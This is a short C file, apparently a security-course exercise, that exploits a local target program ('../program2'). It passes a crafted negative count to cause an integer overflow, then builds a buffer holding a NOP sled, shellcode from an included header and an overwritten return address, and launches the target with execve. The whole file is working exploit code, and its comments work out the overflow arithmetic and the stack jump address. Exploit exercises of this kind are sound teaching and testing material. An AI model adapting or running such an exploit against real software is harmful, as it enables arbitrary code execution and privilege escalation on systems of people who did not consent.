#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "../program2"

int main(void)
{
  char *args[3];
  char *environ[1];
  char buff[39104];
  int i;

  // 610*64 = 39040; count*64 = 39040 --> -2147483037*64 = 39104
  // INT range: -2147483648, 2147483647
  // addr jump: 0xbffeccf0 (a bit more than that -- 0xbffecd10)

  buff[0] = '-'; buff[1] = '2'; buff[2] = '1'; buff[3] = '4';
  buff[4] = '7'; buff[5] = '4'; buff[6] = '8'; buff[7] = '3';
  buff[8] = '0'; buff[9] = '3'; buff[10] = '7'; buff[11] = ',';

  printf("%s\n", buff);
  
  for(i=12;i<(39052+12-strlen(shellcode));i++)
    buff[i] = 0x90;

  strncpy(buff+(39052+12-strlen(shellcode)), shellcode, strlen(shellcode));
  
  buff[39052+12] = 0x10;
  buff[39053+12] = 0xcd;
  buff[39054+12] = 0xfe;
  buff[39055+12] = 0xbf;
  
  for(i=39056+12;i<39104;i++)
    buff[i] = 0x90;

  args[0] = PROGRAM;
  args[1] = buff;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
